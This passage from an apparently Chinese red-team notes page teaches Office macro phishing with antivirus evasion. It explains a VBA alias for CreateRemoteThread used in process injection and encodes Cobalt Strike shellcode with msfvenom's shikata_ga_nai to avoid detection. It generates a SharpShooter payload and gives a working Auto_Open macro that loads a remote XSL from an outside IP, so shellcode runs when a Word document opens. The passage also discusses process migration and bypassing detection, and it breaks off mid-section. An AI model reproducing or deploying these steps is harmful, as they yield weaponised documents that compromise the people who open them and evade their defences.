</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这些声明引用了Windows API函数，用于在VBA环境中调用它们。根据VBA版本（VBA7或更早版本），使用不同的声明方式。</p><ul><li><p><code>CreateStuff</code></p><div class="language-vb line-numbers-mode" data-ext="vb" data-title="vb"><pre class="language-vb"><code><span class="token keyword">Private</span> <span class="token keyword">Declare</span> <span class="token keyword">Function</span> CreateStuff <span class="token keyword">Lib</span> <span class="token string">&quot;kernel32&quot;</span> <span class="token keyword">Alias</span> <span class="token string">&quot;CreateRemoteThread&quot;</span> <span class="token punctuation">(</span>
    <span class="token keyword">ByVal</span> hProcess <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> 
    <span class="token keyword">ByVal</span> lpThreadAttributes <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> 
    <span class="token keyword">ByVal</span> dwStackSize <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> 
    <span class="token keyword">ByVal</span> lpStartAddress <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> 
    lpParameter <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> 
    <span class="token keyword">ByVal</span> dwCreationFlags <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> 
    lpThreadID <span class="token keyword">As</span> <span class="token keyword">Long</span>
<span class="token punctuation">)</span> <span class="token keyword">As</span> <span class="token keyword">Long</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>将 Windows API 中的 <code>CreateRemoteThread</code> 函数声明为一个名为 <code>CreateStuff</code>的VBA函数。</p><ul><li><p><code>Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot;</code></p><ul><li><code>Lib &quot;kernel32&quot;</code>：指定函数位于<code>kernel32.dll</code>库中，这是Windows操作系统的一个核心库</li><li><code>Alias &quot;CreateRemoteThread&quot;</code>：指明VBA中的<code>CreateStuff</code>函数实际调用的是<code>CreateRemoteThread</code>函数</li></ul></li><li><p><code>ByVal(By Value)</code>: 传值, <code>ByRef(By Reference)</code>: 传引用, 如果没有标识是传值(ByVal) 还是传引用(ByRef) 的话默认是传引用(ByRef)</p></li><li><p><code>CreateRemoteThread</code></p><p><code>CreateRemoteThread</code>函数在指定的进程中创建一个线程。这个函数通常用于进程间通信或进程注入操作。</p><p>其参数如下所示</p><ul><li><p><code>hProcess</code></p><p>目标进程的句柄，该进程中将创建新线程</p><p>句柄必须有<code>PROCESS_CREATE_THREAD</code>、<code>PROCESS_QUERY_INFORMATION</code>、<code>PROCESS_VM_OPERATION</code>、<code>PROCESS_VM_WRITE</code>和<code>PROCESS_VM_READ</code>权限</p></li><li><p><code>lpThreadAttributes</code></p><p><code>SECURITY_ATTRIBUTES</code>结构的指针，确定新线程的安全属性。如果该参数为<code>NULL</code>，新线程将具有默认的安全属性。</p></li><li><p><code>dwStackSize</code></p><p>新线程的初始堆栈大小，以字节为单位。如果该参数为0，系统将使用默认大小</p></li><li><p><code>lpStartAddress</code></p><p>指向新线程起始地址的指针，即线程函数的指针。当线程被创建时，它将从这个地址开始执行。</p></li><li><p><code>lpParameter</code></p><p>传递给线程函数的参数。这个参数可以是任何类型的指针，并将作为线程函数的参数传递。</p></li><li><p><code>dwCreationFlags</code></p><p>线程创建标志。可以是以下值之一或它们的组合：</p><ul><li><code>0</code>：立即运行线程。</li><li><code>CREATE_SUSPENDED</code>：创建线程，但不立即运行它。</li></ul></li><li><p><code>lpThreadID</code></p><p>指向接收新线程标识符的变量的指针。如果该参数为<code>NULL</code>，则不返回线程标识符。</p></li></ul></li></ul><hr><ul><li>功能: 创建并启动一个在另一个进程地址空间中运行的新线程</li><li>参数 <ul><li><code>hProcess</code>：一个进程的句柄，该进程是新线程的宿主</li><li><code>lpThreadAttributes</code>：一个指向安全属性的指针，决定新线程的继承句柄（通常设置为<code>0</code>）</li><li><code>dwStackSize</code>：新线程的初始堆栈大小（以字节为单位，通常设置为<code>0</code>以使用默认大小）</li><li><code>lpStartAddress</code>：新线程的起始地址（函数指针）</li><li><code>lpParameter</code>：传递给新线程的参数</li><li><code>dwCreationFlags</code>：线程的创建选项（例如，<code>0</code>表示立即运行）</li><li><code>lpThreadID</code>：一个指向接收新线程ID的变量的指针</li></ul></li><li><strong>返回值</strong>：返回新线程的句柄，失败时返回<code>0</code></li></ul></li></ul><hr><h2 id="vba宏加载远程xsl-xmldom" tabindex="-1"><a class="header-anchor" href="#vba宏加载远程xsl-xmldom"><span>VBA宏加载远程XSL(XMLDOM)</span></a></h2><blockquote><p><a href="https://uknowsec.cn/posts/notes/%E5%8A%A0%E8%BD%BD%E8%BF%9C%E7%A8%8BXSL%E6%96%87%E4%BB%B6%E7%9A%84%E5%AE%8F%E5%85%8D%E6%9D%80%E6%96%B9%E6%B3%95.html" target="_blank" rel="noopener noreferrer">加载远程XSL文件的宏免杀方法 · Uknow - Stay hungry Stay foolish (uknowsec.cn)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><p><a href="https://www.mdsec.co.uk/2019/02/macros-and-more-with-sharpshooter-v2-0/" target="_blank" rel="noopener noreferrer">Macros and More with SharpShooter v2.0 - MDSec<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><p><a href="https://github.com/mdsecactivebreach/SharpShooter" target="_blank" rel="noopener noreferrer">GitHub - mdsecactivebreach/SharpShooter: Payload Generation Framework<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><hr><p><a href="https://www.anquanke.com/post/id/267298" target="_blank" rel="noopener noreferrer">针对Office宏病毒的高级检测-安全客 - 安全资讯平台 (anquanke.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><hr><p><a href="https://www.jianshu.com/p/8b01fca2c177" target="_blank" rel="noopener noreferrer">Office钓鱼攻击绕过进程树检测 - 简书 (jianshu.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p></blockquote><hr><h3 id="概念" tabindex="-1"><a class="header-anchor" href="#概念"><span>概念</span></a></h3><blockquote><p><a href="https://www.w3schools.com/xml/xml_dom.asp" target="_blank" rel="noopener noreferrer">XML文档对象模型 --- XML DOM (w3schools.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p></blockquote><p>DOM(Document Object Model)文档对象模型定义了访问和操作文档的标准</p><p>HTML DOM 定义了访问 HTML 文档的标准方法, 它将 HTML 文档呈现为树结构</p><p>XML DOM 定义了访问和操作 XML 文档的标准方法, 它将 XML 文档呈现为树结构</p><hr><p>以 HTML 和 HTML DOM 为例进行区分</p><ul><li><p>HTML</p><ul><li><code>定义</code>: HTML 是一种标记语言，用于创建网页的结构和内容。它通过一系列标签（如 <code>&lt;div&gt;</code>, <code>&lt;p&gt;</code>, <code>&lt;a&gt;</code> 等）来定义网页的元素。</li><li><code>功能</code>: <ul><li>描述网页的结构和内容：使用标签来定义标题、段落、链接、图像、表格等元素。</li><li>标记内容：通过标签和属性来提供内容的语义信息，如 <code>&lt;h1&gt;</code> 表示主标题，<code>&lt;p&gt;</code> 表示段落。</li></ul></li><li><code>静态</code>: HTML 文档本身是静态的，它只是描述了网页在浏览器中如何呈现。</li></ul><p>例如</p><div class="language-html line-numbers-mode" data-ext="html" data-title="html"><pre class="language-html"><code><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>HTML 示例<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>Hello, World!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>这是一个段落。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>HTML DOM</p><ul><li><code>定义</code>: HTML DOM 是浏览器解析 HTML 文档后生成的对象模型。它表示文档的结构，允许编程语言（主要是 JavaScript）动态访问和操作文档。</li><li><code>功能</code><ul><li>访问和修改：通过 DOM，开发者可以动态地访问和修改文档的内容、结构和样式。例如，添加新的节点、删除现有节点、修改节点的属性和文本内容等。</li><li>事件处理：DOM 提供事件模型，允许开发者注册事件处理程序，以响应用户的交互（如点击、输入等）。</li></ul></li><li><code>动态</code>: HTML DOM 是动态的，通过编程接口，开发者可以在浏览器中实时更新和操作文档。</li></ul></li></ul><hr><h3 id="利用方案" tabindex="-1"><a class="header-anchor" href="#利用方案"><span>利用方案</span></a></h3><h4 id="生成-shellcode-payload-bin" tabindex="-1"><a class="header-anchor" href="#生成-shellcode-payload-bin"><span>生成 Shellcode(Payload.bin)</span></a></h4><p>用 <code>CobaltStrike</code> 生成 Shellcode</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407041118750.png" alt="image-20240704111814786"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407041524657.png" alt="image-20240704152434887"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407041528183.png" alt="image-20240704152857774"></p><hr><h4 id="处理-payload-bin" tabindex="-1"><a class="header-anchor" href="#处理-payload-bin"><span>处理 payload.bin</span></a></h4><p>由于 <code>SharpShooter</code>要求shellcode中不能含有空字节, 所以要用 msfvenom 处理下生成的 payload.bin</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>msfvenom <span class="token parameter variable">-p</span> generic/custom <span class="token assign-left variable">PAYLOADFILE</span><span class="token operator">=</span>./payload_raw_x86_131_80.bin <span class="token parameter variable">-a</span> x86 <span class="token parameter variable">--platform</span> windows <span class="token parameter variable">-e</span> x86/shikata_ga_nai <span class="token parameter variable">-f</span> raw <span class="token parameter variable">-o</span> shellcode-encoded.bin <span class="token parameter variable">-b</span> <span class="token string">&quot;<span class="token entity" title="\x00">\x00</span>&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li><p><code>-p generic/custom</code>：指定使用自定义的 payload。</p></li><li><p><code>PAYLOADFILE=./payload.bin</code>：指定自定义 payload 的文件路径，这里是当前目录下的 <code>payload.bin</code> 文件。</p></li><li><p><code>-a x86</code>：指定目标架构为 x86（32 位）。</p></li><li><p><code>--platform windows</code>：指定目标平台为 Windows。</p></li><li><p><code>-e x86/shikata_ga_nai</code>：使用 <code>x86/shikata_ga_nai</code> 编码器对 payload 进行编码。</p><p><code>shikata_ga_nai</code> 是一种多态编码器，能有效地混淆 payload，以绕过防病毒软件的检测。</p></li><li><p><code>-f raw</code>：指定输出格式为原始二进制格式（raw）。</p></li><li><p><code>-o shellcode-encoded.bin</code>：指定输出文件名为 <code>shellcode-encoded.bin</code>。</p></li><li><p><code>-b &quot;\x00&quot;</code>：指定在编码过程中要避免的字节，这里是 <code>\x00</code>（空字节），通常为了防止字符串终止符影响 payload 的执行。</p></li></ul><hr><h4 id="生成-xsl-和-macro" tabindex="-1"><a class="header-anchor" href="#生成-xsl-和-macro"><span>生成 xsl 和 macro</span></a></h4><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token comment"># clone SharpShooter Repo</span>
<span class="token function">git</span> clone https://github.com/mdsecactivebreach/SharpShooter.git

// 代理
<span class="token function">git</span> clone https://ghproxy.org/https://github.com/mdsecactivebreach/SharpShooter.git

<span class="token builtin class-name">cd</span> SharpShooter
virtualenv <span class="token parameter variable">-p</span> python2 ss2
<span class="token builtin class-name">source</span> ss2/bin/activate
pip <span class="token function">install</span> <span class="token parameter variable">-r</span> requirements.txt

<span class="token comment"># 生成 xsl 和 macro 文件</span>
python SharpShooter.py <span class="token parameter variable">--stageless</span> <span class="token parameter variable">--dotnetver</span> <span class="token number">2</span> <span class="token parameter variable">--payload</span> macro <span class="token parameter variable">--output</span> foo <span class="token parameter variable">--rawscfile</span> <span class="token punctuation">..</span>/shellcode-encoded.bin <span class="token parameter variable">--com</span> xslremote <span class="token parameter variable">--awlurl</span> http://100.1.1.131:8000/download/foo.xsl

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>–dotnetver：为目标的.net版本，可选2或者4</li><li>–awlurl： xsl存放地址</li></ul><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407041743965.png" alt="image-20240704174338316"></p><hr><p><code>foo.macro</code>: 创建一个 COM 对象加载远程 XSL</p><div class="language-vb line-numbers-mode" data-ext="vb" data-title="vb"><pre class="language-vb"><code><span class="token keyword">Sub</span> Auto_Open<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">Set</span> XML <span class="token operator">=</span> CreateObject<span class="token punctuation">(</span><span class="token string">&quot;Microsoft.XMLDOM&quot;</span><span class="token punctuation">)</span>
    XML<span class="token punctuation">.</span>async <span class="token operator">=</span> <span class="token boolean">False</span>
    <span class="token keyword">Set</span> xsl <span class="token operator">=</span> XML
    xsl<span class="token punctuation">.</span>Load <span class="token string">&quot;http://100.1.1.131:8000/download/foo.xsl&quot;</span>
    XML<span class="token punctuation">.</span>transformNode xsl
<span class="token keyword">End</span> <span class="token keyword">Sub</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407051004339.png" alt="image-20240705100413007"></p><p><code>foo.xsl</code>中包含了处理后的 shellcode</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407041749735.png" alt="image-20240704174925409"></p><hr><ol><li><p>新建启用宏的 word 文档 <code>VBA_XMLDOM.docm</code></p></li><li><p>在 Word 中编辑宏脚本(ALT+F11)</p></li><li><p>在“工程 – Project”窗口中，双击“Microsoft Word 对象”，再双击“ThisDocument”。</p></li><li><p>此时在右侧代码窗口顶部，会看到两个列表框，单击左侧下拉列表，将其从“（通用）”更改为“Document”，单击右侧下拉列表，从列表中选择“Close”或“Open”以插入 Document_Close()或 Document_Open()过程，或者可直接在代码窗口输入过程名。</p></li></ol><div class="language-vb line-numbers-mode" data-ext="vb" data-title="vb"><pre class="language-vb"><code><span class="token keyword">Sub</span> Auto_Open<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">Set</span> XML <span class="token operator">=</span> CreateObject<span class="token punctuation">(</span><span class="token string">&quot;Microsoft.XMLDOM&quot;</span><span class="token punctuation">)</span>
    XML<span class="token punctuation">.</span>async <span class="token operator">=</span> <span class="token boolean">False</span>
    <span class="token keyword">Set</span> xsl <span class="token operator">=</span> XML
    xsl<span class="token punctuation">.</span>Load <span class="token string">&quot;http://100.1.1.131:8000/download/foo.xsl&quot;</span>
    XML<span class="token punctuation">.</span>transformNode xsl
<span class="token keyword">End</span> <span class="token keyword">Sub</span>
<span class="token keyword">Sub</span> AutoOpen<span class="token punctuation">(</span><span class="token punctuation">)</span>
    Auto_Open
<span class="token keyword">End</span> <span class="token keyword">Sub</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>保存然后重新打开这个 docm 文档</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407051033298.png" alt="image-20240705103356923"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407051035870.png" alt="image-20240705103555605"></p><hr><p>可以看到的是这样虽然可以上线, 但是 word 进程会崩, 如果结束 word 进程那么相应的 cs 也会掉线, 因此需要将上线目标迁移到其他进程上</p><blockquote><p><a href="https://uknowsec.cn/posts/notes/%E5%8A%A0%E8%BD%BD%E8%BF%9C%E7%A8%8BXSL%E6%96%87%E4%BB%B6%E7%9A%84%E5%AE%8F%E5%85%8D%E6%9D%80%E6%96%B9%E6%B3%95.html" target="_blank" rel="noopener noreferrer">加载远程XSL文件的宏免杀方法 · Uknow - Stay hungry Stay foolish (uknowsec.cn)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p></blockquote><ul><li>Cobalt Strike：通过插件实现上线后自动迁移进程，<a href="https://github.com/threatexpress/aggressor-scripts/tree/d6bdbd587379d7da2a337d19cccdee1a8628d1d8/beacon_handler" target="_blank" rel="noopener noreferrer">Beacon Handler Suite<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li>Metasploit: 在设置监听的时间可以设置：<code>set autorunscript migrate -N explorer.exe 或 set autorunscript -f</code></li></ul><blockquote><p>TODO: 看下这个进程迁移是怎么实现的</p></blockquote><hr><h2 id="相关链接" tabindex="-1"><a class="header-anchor" href="#相关链接"><span>相关链接</span></a></h2><ul><li><a href="https://www.jianshu.com/p/dcd250593698" target="_blank" rel="noopener noreferrer">钓鱼姿势汇总 - 简书 (jianshu.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://xz.aliyun.com/t/10339?time__1311=Cqjx2QD%3DiteWqGNDQimOgbtDtt0QtDReOYD" target="_blank" rel="noopener noreferrer">常见钓鱼招式 - 先知社区 (aliyun.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li></ul><hr><h2 id="宏免杀" tabindex="-1"><a class="header-anchor" href="#宏免杀"><span>宏免杀</span></a></h2><blockquote><p><a href="https://www.cnblogs.com/nanjiangyue/p/14009407.html" target="_blank" rel="noopener noreferrer">cobal strike 钓鱼----word宏木马（免杀） - 江楠O_O - 博客园 (cnblogs.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><p><a href="https://www.freebuf.com/articles/network/317116.html" target="_blank" rel="noopener noreferrer">wps和office宏钓鱼从认识到免杀 - FreeBuf网络安全行业门户<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247502110&amp;idx=1&amp;sn=2442cfc935de67607f986140e8c8ad4e&amp;chksm=ec1c9c21db6b1537dc321bd939da8cc3bfe5917245867bf666ae0d9764c950cd510973bb067b&amp;mpshare=1&amp;scene=23&amp;srcid=1208ExmPmeeluOtedlykpzwj&amp;sharer_sharetime=1638967527162&amp;sharer_shareid=d6f91fc924ad833bb5231d972b990ef9#rd" target="_blank" rel="noopener noreferrer">干货 | Office文档钓鱼之如何快速进行宏免杀 (qq.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><p><a href="https://cloud.tencent.com/developer/article/1917641" target="_blank" rel="noopener noreferrer">干货 | Office文档钓鱼的实战和免杀技巧-腾讯云开发者社区-腾讯云 (tencent.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><hr><p><a href="https://www.4hou.com/posts/mMZE" target="_blank" rel="noopener noreferrer">红队渗透测试技术：如何通过鱼叉式网络钓鱼获得攻击机会？ - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p></blockquote><hr><h3 id="绕过基于进程树的检测" tabindex="-1"><a class="header-anchor" href="#绕过基于进程树的检测"><span>绕过基于进程树的检测</span></a></h3><h4 id="连接到-wmi-新建进程" tabindex="-1"><a class="header-anchor" href="#连接到-wmi-新建进程"><span>连接到 WMI 新建进程</span></a></h4><div class="language-vb line-numbers-mode" data-ext="vb" 